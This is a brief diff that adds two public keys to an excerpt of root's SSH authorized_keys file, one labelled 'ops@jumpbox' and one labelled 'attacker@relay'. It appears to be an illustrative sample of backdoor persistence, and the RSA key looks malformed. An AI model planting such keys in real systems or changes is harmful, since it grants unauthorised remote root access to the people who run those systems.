@@ -1,0 +1,3 @@
+# /root/.ssh/authorized_keys (excerpt)
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIF+2FQwqZk3oQnqv9u7hN8J8u2N0xC0b1jXv6nCjQb1Y ops@jumpbox
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDVt7x4nFjvYlqg5cJcY1l3zTqv0zK3W4q9d8B8mYwR6p9y1dX2vGqfE1tqQ+qk1yJ2p5JpZx0a1c9g3d3iT0r0m4q9s8u3P+qW7wqZQkq1p9k5aNw4lEwQ8m1xv attacker@relay
